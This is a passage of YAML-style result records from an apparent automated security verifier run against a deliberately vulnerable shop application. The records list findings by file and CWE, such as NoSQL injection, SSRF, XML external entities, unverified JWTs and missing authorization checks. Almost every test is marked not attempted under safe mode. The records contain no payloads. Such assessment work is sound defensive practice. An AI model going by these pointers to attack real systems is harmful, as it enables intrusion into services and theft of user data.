+  verdict: not-attempted
+  confidence: null
+  rationale: 'not tested: safe mode; without a declared test resource the Verifier
+    creates one, which writes'
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: routes/basketItems.ts
+    source_line: null
+- result_id: VF-039
+  finding_ref:
+    id: T-035
+    match_key: routes/updateproductreviews.ts|CWE-943
+    instance: routes/updateProductReviews.ts:18
+    title: NoSQL operator injection and missing — routes/updateProductReviews.ts:18
+    cwe: CWE-943
+    variant: variant-001
+    variant_digest: c553d78e99b00119c842f793f6210cc8f35f5c040e7a5da686ac9e50c41d133e
+  class: injection
+  eligibility:
+    status: dynamic
+    reason: 'proof: behavioural-difference'
+  verdict: not-attempted
+  confidence: null
+  rationale: 'not tested: safe mode; every declared variant needs a state change'
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: routes/updateProductReviews.ts
+    source_line: null
+- result_id: VF-040
+  finding_ref:
+    id: T-036
+    match_key: routes/wallet.ts|CWE-1284
+    instance: routes/wallet.ts:27
+    title: Wallet top-up accepts unvalidated attacker-chosen balance — routes/wallet.ts:27
+    cwe: CWE-1284
+    variant: v1
+    variant_digest: 979cde9b5b85f99c680584456a259d9a1e8115c5fe0709fb2551f2c736e535f6
+  class: null
+  eligibility:
+    status: unsupported
+    reason: no supported proof method for CWE-1284
+  verdict: not-attempted
+  confidence: null
+  rationale: no supported proof method for CWE-1284
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: routes/wallet.ts
+    source_line: null
+- result_id: VF-041
+  finding_ref:
+    id: T-038
+    match_key: routes/chat.ts|CWE-1427
+    instance: routes/chat.ts:206
+    title: Chatbot accepts client-supplied message roles and history — routes/chat.ts:206
+    cwe: CWE-1427
+    variant: variant-001
+    variant_digest: 8ae221f7d6be40edf84675c451bd70cff178116ab517c86fb4b974d8247ba70c
+  class: null
+  eligibility:
+    status: unsupported
+    reason: no supported proof method for CWE-1427
+  verdict: not-attempted
+  confidence: null
+  rationale: no supported proof method for CWE-1427
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: routes/chat.ts
+    source_line: null
+- result_id: VF-042
+  finding_ref:
+    id: T-041
+    match_key: lib/xml.ts|CWE-611
+    instance: lib/xml.ts:38
+    title: XML parser resolves external entities in uploads — lib/xml.ts:38
+    cwe: CWE-611
+    variant: v1
+    variant_digest: 97b06789248aefee1133ccdfc1ffdc56d3fce26497d897df643edcf7fdd35859
+  class: null
+  eligibility:
+    status: unsupported
+    reason: no supported proof method for CWE-611
+  verdict: not-attempted
+  confidence: null
+  rationale: no supported proof method for CWE-611
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: lib/xml.ts
+    source_line: null
+- result_id: VF-043
+  finding_ref:
+    id: T-044
+    match_key: routes/profileimageurlupload.ts|CWE-918
+    instance: routes/profileImageUrlUpload.ts:24
+    title: Server-side request forgery in profile — routes/profileImageUrlUpload.ts:24
+    cwe: CWE-918
+    variant: variant-001
+    variant_digest: 78f76a81b3250c9ca28350a62e1a32f20cffeaaa9fb3cce93b4537fa7fb59f17
+  class: ssrf
+  eligibility:
+    status: dynamic
+    reason: 'proof: out-of-band-callback'
+  verdict: not-attempted
+  confidence: null
+  rationale: 'not tested: safe mode; every request the assessment names writes'
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: routes/profileImageUrlUpload.ts
+    source_line: null
+- result_id: VF-044
+  finding_ref:
+    id: T-044
+    match_key: routes/profileimageurlupload.ts|CWE-918
+    instance: routes/profileImageUrlUpload.ts:24
+    title: Server-side request forgery in profile — routes/profileImageUrlUpload.ts:24
+    cwe: CWE-918
+    variant: variant-002
+    variant_digest: 79d819947a4f258e848f47976ca617a1f984ff0a70deb39ba594cc4ed6895250
+  class: ssrf
+  eligibility:
+    status: dynamic
+    reason: 'proof: out-of-band-callback'
+  verdict: not-attempted
+  confidence: null
+  rationale: 'not tested: safe mode; every declared variant needs a state change'
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: routes/profileImageUrlUpload.ts
+    source_line: null
+- result_id: VF-045
+  finding_ref:
+    id: T-046
+    match_key: routes/resetpassword.ts|CWE-200
+    instance: routes/resetPassword.ts:46
+    title: Password reset response returns full user record — routes/resetPassword.ts:46
+    cwe: CWE-200
+    variant: reset-response
+    variant_digest: 8c9b5f8edcdea2be244fc2dfd7a3c5a6530aa45f6c09a430090f310066dcc78a
+  class: access-control
+  eligibility:
+    status: dynamic
+    reason: 'proof: cross-identity-contrast'
+  verdict: not-attempted
+  confidence: null
+  rationale: 'not tested: safe mode; every declared variant needs a state change'
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: routes/resetPassword.ts
+    source_line: null
+- result_id: VF-046
+  finding_ref:
+    id: T-047
+    match_key: lib/insecurity.ts|CWE-328
+    instance: lib/insecurity.ts:41
+    title: Unsalted MD5 password hashing and no strength policy — lib/insecurity.ts:41
+    cwe: CWE-328
+    variant: null
+    variant_digest: null
+  class: null
+  eligibility:
+    status: unsupported
+    reason: no supported proof method for CWE-328
+  verdict: not-attempted
+  confidence: null
+  rationale: no supported proof method for CWE-328
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: lib/insecurity.ts
+    source_line: null
+- result_id: VF-047
+  finding_ref:
+    id: T-049
+    match_key: routes/chat.ts|resource-exhaustion
+    instance: routes/chat.ts:203
+    title: Chat endpoint has no request or consumption limits
+    cwe: CWE-770
+    variant: null
+    variant_digest: null
+  class: null
+  eligibility:
+    status: unsupported
+    reason: no supported proof method for CWE-770
+  verdict: not-attempted
+  confidence: null
+  rationale: no supported proof method for CWE-770
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: routes/chat.ts
+    source_line: null
+- result_id: VF-048
+  finding_ref:
+    id: T-050
+    match_key: routes/basketitems.ts|CWE-639
+    instance: routes/basketItems.ts:42
+    title: Basket item add checks different BasketId than it — routes/basketItems.ts:42
+    cwe: CWE-639
+    variant: null
+    variant_digest: null
+  class: access-control
+  eligibility:
+    status: dynamic
+    reason: 'proof: cross-identity-contrast'
+  verdict: not-attempted
+  confidence: null
+  rationale: 'not tested: safe mode; without a declared test resource the Verifier
+    creates one, which writes'
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: routes/basketItems.ts
+    source_line: null
+- result_id: VF-049
+  finding_ref:
+    id: T-051
+    match_key: routes/createproductreviews.ts|CWE-639
+    instance: routes/createProductReviews.ts:26
+    title: Review author taken from request body — routes/createProductReviews.ts:26
+    cwe: CWE-639
+    variant: v1
+    variant_digest: e59c48bc1149982ca1d6d53183fb2a159da3a845a4cbc4725ce24a1b1dbcc8e6
+  class: access-control
+  eligibility:
+    status: dynamic
+    reason: 'proof: cross-identity-contrast'
+  verdict: not-attempted
+  confidence: null
+  rationale: 'not tested: safe mode; without a declared test resource the Verifier
+    creates one, which writes'
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: routes/createProductReviews.ts
+    source_line: null
+- result_id: VF-050
+  finding_ref:
+    id: T-052
+    match_key: routes/updateproductreviews.ts|CWE-639
+    instance: routes/updateProductReviews.ts:18
+    title: Review update lacks ownership check — routes/updateProductReviews.ts:18
+    cwe: CWE-639
+    variant: null
+    variant_digest: null
+  class: access-control
+  eligibility:
+    status: dynamic
+    reason: 'proof: cross-identity-contrast'
+  verdict: not-attempted
+  confidence: null
+  rationale: 'not tested: safe mode; without a declared test resource the Verifier
+    creates one, which writes'
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: routes/updateProductReviews.ts
+    source_line: null
+- result_id: VF-051
+  finding_ref:
+    id: T-057
+    match_key: routes/deluxe.ts|CWE-862
+    instance: routes/deluxe.ts:43
+    title: Deluxe upgrade skips payment verification — routes/deluxe.ts:43
+    cwe: CWE-862
+    variant: v-1
+    variant_digest: 3faf61f945ce97f04bfa16efd5ad6e486778847dee6c3d3c68890ad741ee4aae
+  class: access-control
+  eligibility:
+    status: dynamic
+    reason: 'proof: cross-identity-contrast'
+  verdict: not-attempted
+  confidence: null
+  rationale: 'not tested: safe mode; every request the assessment names writes'
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: routes/deluxe.ts
+    source_line: null
+- result_id: VF-052
+  finding_ref:
+    id: T-059
+    match_key: server.ts|CWE-862
+    instance: server.ts:310
+    title: Sensitive Routes Registered Without Authentication Middleware
+    cwe: CWE-862
+    variant: null
+    variant_digest: null
+  class: access-control
+  eligibility:
+    status: dynamic
+    reason: 'proof: cross-identity-contrast'
+  verdict: not-attempted
+  confidence: null
+  rationale: 'not tested: safe mode; every request the assessment names writes'
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: server.ts
+    source_line: null
+- result_id: VF-053
+  finding_ref:
+    id: T-061
+    match_key: server.ts|CWE-862
+    instance: server.ts:369
+    title: Any authenticated user can create products with chosen prices — server.ts:369
+    cwe: CWE-862
+    variant: null
+    variant_digest: null
+  class: access-control
+  eligibility:
+    status: dynamic
+    reason: 'proof: cross-identity-contrast'
+  verdict: not-attempted
+  confidence: null
+  rationale: 'not tested: safe mode; every request the assessment names writes'
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: server.ts
+    source_line: null
+- result_id: VF-054
+  finding_ref:
+    id: T-063
+    match_key: server.ts|CWE-862
+    instance: server.ts:501
+    title: Unauthenticated product update — server.ts:501
+    cwe: CWE-862
+    variant: null
+    variant_digest: null
+  class: access-control
+  eligibility:
+    status: dynamic
+    reason: 'proof: cross-identity-contrast'
+  verdict: not-attempted
+  confidence: null
+  rationale: 'not tested: safe mode; every request the assessment names writes'
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: server.ts
+    source_line: null
+- result_id: VF-055
+  finding_ref:
+    id: T-065
+    match_key: routes/chat.ts|CWE-863
+    instance: routes/chat.ts:184
+    title: Chatbot coupon tool lacks server-side authorization — routes/chat.ts:184
+    cwe: CWE-863
+    variant: variant-001
+    variant_digest: 39019dd91295829a4e2fc07449f55e725708336767ecb240c04a6f64a995bc60
+  class: access-control
+  eligibility:
+    status: dynamic
+    reason: 'proof: cross-identity-contrast'
+  verdict: not-attempted
+  confidence: null
+  rationale: 'not tested: safe mode; every request the assessment names writes'
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: routes/chat.ts
+    source_line: null
+- result_id: VF-056
+  finding_ref:
+    id: T-003
+    match_key: frontend/src/app/services/request.interceptor.ts|CWE-922
+    instance: frontend/src/app/Services/request.interceptor.ts:16
+    title: JWT Stored in Script-Readable Storage
+    cwe: CWE-922
+    variant: null
+    variant_digest: null
+  class: null
+  eligibility:
+    status: unsupported
+    reason: no supported proof method for CWE-922
+  verdict: not-attempted
+  confidence: null
+  rationale: no supported proof method for CWE-922
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: frontend/src/app/Services/request.interceptor.ts
+    source_line: null
+- result_id: VF-057
+  finding_ref:
+    id: T-016
+    match_key: frontend/src/app/login/login.component.ts|sig-verify
+    instance: frontend/src/app/login/login.component.ts:148
+    title: OAuth implicit flow without state, nonce or audience — login.component.ts:148
+    cwe: CWE-345
+    variant: null
+    variant_digest: null
+  class: null
+  eligibility:
+    status: unsupported
+    reason: no supported proof method for CWE-345
+  verdict: not-attempted
+  confidence: null
+  rationale: no supported proof method for CWE-345
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: frontend/src/app/login/login.component.ts
+    source_line: null
+- result_id: VF-058
+  finding_ref:
+    id: T-017
+    match_key: frontend/src/app/oauth/oauth.component.ts|CWE-1391
+    instance: frontend/src/app/oauth/oauth.component.ts:30
+    title: Predictable password derived from OAuth email — oauth.component.ts:30
+    cwe: CWE-1391
+    variant: null
+    variant_digest: null
+  class: null
+  eligibility:
+    status: unsupported
+    reason: no supported proof method for CWE-1391
+  verdict: not-attempted
+  confidence: null
+  rationale: no supported proof method for CWE-1391
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: frontend/src/app/oauth/oauth.component.ts
+    source_line: null
+- result_id: VF-059
+  finding_ref:
+    id: T-018
+    match_key: lib/insecurity.ts|CWE-330
+    instance: lib/insecurity.ts:53
+    title: Non-cryptographic RNG for a secret/token — lib/insecurity.ts:53
+    cwe: CWE-330
+    variant: null
+    variant_digest: null
+  class: null
+  eligibility:
+    status: unsupported
+    reason: no supported proof method for CWE-330
+  verdict: not-attempted
+  confidence: null
+  rationale: no supported proof method for CWE-330
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: lib/insecurity.ts
+    source_line: null
+- result_id: VF-060
+  finding_ref:
+    id: T-019
+    match_key: lib/insecurity.ts|sig-verify
+    instance: lib/insecurity.ts:56
+    title: JWT decode used without signature verification — lib/insecurity.ts:56
+    cwe: CWE-345
+    variant: null
+    variant_digest: null
+  class: null
+  eligibility:
+    status: unsupported
+    reason: no supported proof method for CWE-345
+  verdict: not-attempted
+  confidence: null
+  rationale: no supported proof method for CWE-345
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: lib/insecurity.ts
+    source_line: null
+- result_id: VF-061
+  finding_ref:
+    id: T-020
+    match_key: lib/insecurity.ts|sig-verify
+    instance: lib/insecurity.ts:53
+    title: Insecure JWT Verification
+    cwe: CWE-347
+    variant: null
+    variant_digest: null
+  class: null
+  eligibility:
+    status: unsupported
+    reason: no supported proof method for CWE-347
+  verdict: not-attempted
+  confidence: null
+  rationale: no supported proof method for CWE-347
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: lib/insecurity.ts
+    source_line: null
+- result_id: VF-062
+  finding_ref:
+    id: T-021
+    match_key: routes/resetpassword.ts|CWE-640
+    instance: routes/resetPassword.ts:10
+    title: Password reset accepts a security-question answer — routes/resetPassword.ts:10
+    cwe: CWE-640
+    variant: null
+    variant_digest: null
+  class: null
+  eligibility:
+    status: unsupported
+    reason: no supported proof method for CWE-640
+  verdict: not-attempted
+  confidence: null
+  rationale: no supported proof method for CWE-640
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: routes/resetPassword.ts
+    source_line: null
+- result_id: VF-063
+  finding_ref:
+    id: T-028
+    match_key: routes/order.ts|CWE-602
+    instance: routes/order.ts:201
+    title: Expired coupon campaigns accepted from client-supplied — routes/order.ts:201
+    cwe: CWE-602
+    variant: null
+    variant_digest: null
+  class: null
+  eligibility:
+    status: unsupported
+    reason: no supported proof method for CWE-602
+  verdict: not-attempted
+  confidence: null
+  rationale: no supported proof method for CWE-602
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: routes/order.ts
+    source_line: null
+- result_id: VF-064
+  finding_ref:
+    id: T-029
+    match_key: lib/xml.ts|CWE-611
+    instance: lib/xml.ts:35
+    title: XML parser resolves external entities and DTDs — lib/xml.ts:35
+    cwe: CWE-611
+    variant: null
+    variant_digest: null
+  class: null
+  eligibility:
+    status: unsupported
+    reason: no supported proof method for CWE-611
+  verdict: not-attempted
+  confidence: null
+  rationale: no supported proof method for CWE-611
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: lib/xml.ts
+    source_line: null
+- result_id: VF-065
+  finding_ref:
+    id: T-039
+    match_key: routes/keyserver.ts|CWE-538
+    instance: routes/keyServer.ts:14
+    title: Unauthenticated key and log file exposure — routes/keyServer.ts:14
+    cwe: CWE-538
+    variant: null
+    variant_digest: null
+  class: access-control
+  eligibility:
+    status: dynamic
+    reason: 'proof: cross-identity-contrast'
+  verdict: inconclusive
+  confidence: null
+  rationale: 'stopped: three actions in a row failed without a usable observation;
+    the last: plan_test: the comparison sends one concrete GET: give path as /a/b
+    with every placeholder filled in, and query inputs in fixed.params'
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations:
+  - 'Derived request: ALL /encryptionkeys/:file, resolved from the source before the
+    test. Reason: server.ts:278 registers it for a handler of routes/keyServer.ts'
+  limits_hit: stagnation
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review:
+    status: not-reviewed
+    rounds: 0
+    reviews: 0
+    visual_review: not-performed
+    images_reviewed: []
+    reason: 'Review not started: no confirmed variant to present.'
+    issues: []
+    presentations: []
+    variants:
+    - T-039
+  technical_review:
+    status: not-reviewed
+    rounds: 0
+    reviews: 0
+    inspected_steps: []
+    reason: No proposed conclusion was reviewed.
+    issues: []
+  selection_reason: null
+  target_location:
+    source_file: routes/keyServer.ts
+    source_line: null
+  timing:
+    started: '2026-11-12T12:52:32.457421Z'
+    finished: '2026-11-12T12:53:18.179769Z'
+- result_id: VF-066
+  finding_ref:
+    id: T-040
+    match_key: lib/xml.ts|CWE-611
+    instance: lib/xml.ts:35
+    title: XML external entity expansion in upload parser — lib/xml.ts:35
+    cwe: CWE-611
+    variant: null
+    variant_digest: null
+  class: null
+  eligibility:
+    status: unsupported
+    reason: no supported proof method for CWE-611
+  verdict: not-attempted
+  confidence: null
+  rationale: no supported proof method for CWE-611
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: lib/xml.ts
+    source_line: null
+- result_id: VF-067
+  finding_ref:
+    id: T-043
+    match_key: routes/changepassword.ts|password-weak
+    instance: routes/changePassword.ts:39
+    title: Password verification relies on unsalted MD5 — routes/changePassword.ts:39
+    cwe: CWE-916
+    variant: null
+    variant_digest: null
+  class: null
+  eligibility:
+    status: unsupported
+    reason: no supported proof method for CWE-916
+  verdict: not-attempted
+  confidence: null
+  rationale: no supported proof method for CWE-916
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: routes/changePassword.ts
+    source_line: null
+- result_id: VF-068
+  finding_ref:
+    id: T-045
+    match_key: models/user.ts|password-weak
+    instance: models/user.ts:76
+    title: Passwords hashed with unsalted MD5 in User model setter — models/user.ts:76
+    cwe: CWE-916
+    variant: null
+    variant_digest: null
+  class: null
+  eligibility:
+    status: unsupported
+    reason: no supported proof method for CWE-916
+  verdict: not-attempted
+  confidence: null
+  rationale: no supported proof method for CWE-916
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: models/user.ts
+    source_line: null
+- result_id: VF-069
+  finding_ref:
+    id: T-064
+    match_key: routes/basketitems.ts|CWE-863
+    instance: routes/basketItems.ts:37
+    title: Duplicate JSON key bypasses basket ownership check — routes/basketItems.ts:37
+    cwe: CWE-863
+    variant: null
+    variant_digest: null
+  class: access-control
+  eligibility:
+    status: dynamic
+    reason: 'proof: cross-identity-contrast'
+  verdict: not-attempted
+  confidence: null
+  rationale: 'not tested: safe mode; every request the source registers for its handlers
+    writes'
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: routes/basketItems.ts
+    source_line: null
